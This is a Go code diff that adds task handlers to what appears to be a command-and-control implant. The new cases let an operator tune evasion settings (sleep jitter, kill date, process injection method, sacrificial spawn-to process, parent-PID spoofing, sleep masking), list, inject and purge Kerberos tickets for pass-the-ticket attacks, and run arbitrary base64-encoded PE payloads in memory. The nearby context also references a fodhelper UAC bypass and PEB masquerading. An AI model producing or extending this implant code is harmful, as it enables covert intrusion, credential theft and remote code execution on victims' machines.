@@ -87,6 +87,56 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, "sleep updated", "")
 
+	case "CONFIG":
+		var cfg struct {
+			SleepSec     int    `json:"sleep_sec"`
+			JitterPct    int    `json:"jitter_pct"`
+			WorkingHours string `json:"working_hours"`
+			KillDate     string `json:"kill_date"`
+			InjectMethod string `json:"inject_method"`
+			SpawnTo      string `json:"spawnto"`
+			PPIDSpoof    string `json:"ppid"`
+			SleepMask    string `json:"sleep_mask"`
+		}
+		if err := json.Unmarshal([]byte(task.Args), &cfg); err != nil {
+			t.sendResult(task.ID, "", "config: "+err.Error())
+			break
+		}
+		updated := []string{}
+		if cfg.SleepSec > 0 {
+			updateSleep(cfg.SleepSec, cfg.JitterPct)
+			updated = append(updated, fmt.Sprintf("sleep=%ds±%d%%", cfg.SleepSec, cfg.JitterPct))
+		}
+		if cfg.WorkingHours != "" {
+			WorkingHours = cfg.WorkingHours
+			updated = append(updated, "working_hours="+cfg.WorkingHours)
+		}
+		if cfg.KillDate != "" {
+			KillDate = cfg.KillDate
+			updated = append(updated, "kill_date="+cfg.KillDate)
+		}
+		if cfg.InjectMethod != "" {
+			InjectMethod = cfg.InjectMethod
+			updated = append(updated, "inject_method="+cfg.InjectMethod)
+		}
+		if cfg.SpawnTo != "" {
+			SacrificialProc = cfg.SpawnTo
+			updated = append(updated, "spawnto="+cfg.SpawnTo)
+		}
+		if cfg.PPIDSpoof != "" {
+			PPIDSpoof = cfg.PPIDSpoof
+			updated = append(updated, "ppid="+cfg.PPIDSpoof)
+		}
+		if cfg.SleepMask != "" {
+			SleepMaskMode = cfg.SleepMask
+			updated = append(updated, "sleep_mask="+cfg.SleepMask)
+		}
+		msg := "[+] config updated"
+		if len(updated) > 0 {
+			msg += ": " + strings.Join(updated, ", ")
+		}
+		t.sendResult(task.ID, msg, "")
+
 	case "SYSINFO":
 		info := getSysInfo()
 		out := fmt.Sprintf("hostname=%s user=%s os=%s pid=%d",
@@ -1112,6 +1162,44 @@ func dispatchTask(t transport, task taskWire) {
 			out = uacFodHelper(cmd)
 		}
 		t.sendResult(task.ID, out, "")
+
+	// ── Kerberos operations ───────────────────────────────────────────────────
+
+	case "KERB_LIST":
+		t.sendResult(task.ID, kerberosListTickets(), "")
+
+	case "KERB_PTT":
+		// Args JSON: {"ticket":"<base64-encoded .kirbi>"}
+		var ka struct {
+			Ticket string `json:"ticket"`
+		}
+		if err := json.Unmarshal([]byte(task.Args), &ka); err != nil {
+			t.sendResult(task.ID, "", "bad KERB_PTT args: "+err.Error())
+			return
+		}
+		if ka.Ticket == "" {
+			t.sendResult(task.ID, "", "KERB_PTT: ticket field is empty")
+			return
+		}
+		t.sendResult(task.ID, kerberosPassTheTicket(ka.Ticket), "")
+
+	case "KERB_PURGE":
+		t.sendResult(task.ID, kerberosPurge(), "")
+
+	// ── Inline PE execution ───────────────────────────────────────────────────
+
+	case "EXEC_PE":
+		// Payload: base64-encoded raw PE bytes. Args (optional): command-line hint.
+		if task.Payload == "" {
+			t.sendResult(task.ID, "", "EXEC_PE: empty payload")
+			return
+		}
+		pebytes, err := base64.StdEncoding.DecodeString(task.Payload)
+		if err != nil {
+			t.sendResult(task.ID, "", "EXEC_PE: decode payload: "+err.Error())
+			return
+		}
+		t.sendResult(task.ID, execPE(pebytes, task.Args), "")
 
 	// ── PEB Masquerading ──────────────────────────────────────────────────────
 
